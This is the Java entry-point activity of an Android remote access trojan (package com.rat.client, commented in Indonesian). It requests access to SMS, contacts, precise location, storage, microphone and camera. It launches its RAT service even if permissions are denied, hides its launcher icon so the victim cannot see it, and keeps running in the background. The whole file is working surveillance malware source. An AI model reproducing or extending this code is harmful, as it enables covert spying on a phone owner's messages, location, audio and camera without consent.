// language: Java, file: MainActivity.java
// Entry point — request permissions, sembunyikan icon, start service
package com.rat.client;

import android.app.*;
import android.content.*;
import android.content.pm.*;
import android.os.*;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.*;

public class MainActivity extends Activity {

    private static final int PERM_REQ = 100;
    private static final String[] PERMISSIONS = {
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.READ_EXTERNAL_STORAGE,
        android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
        android.Manifest.permission.RECORD_AUDIO,
        android.Manifest.permission.CAMERA,
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        List<String> needed = new ArrayList<>();
        for (String p : PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p)
                    != PackageManager.PERMISSION_GRANTED)
                needed.add(p);
        }

        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                needed.toArray(new String[0]), PERM_REQ);
        } else {
            startRat();
        }
    }

    @Override
    public void onRequestPermissionsResult(int req,
            String[] perms, int[] results) {
        startRat(); // start regardless — partial permissions tetap jalan
    }

    private void startRat() {
        // sembunyikan icon launcher
        ComponentName comp = new ComponentName(this, MainActivity.class);
        getPackageManager().setComponentEnabledSetting(comp,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP);

        // start foreground service
        Intent svc = new Intent(this, RATService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            startForegroundService(svc);
        else
            startService(svc);

        finish(); // tutup activity, service tetap jalan
    }
}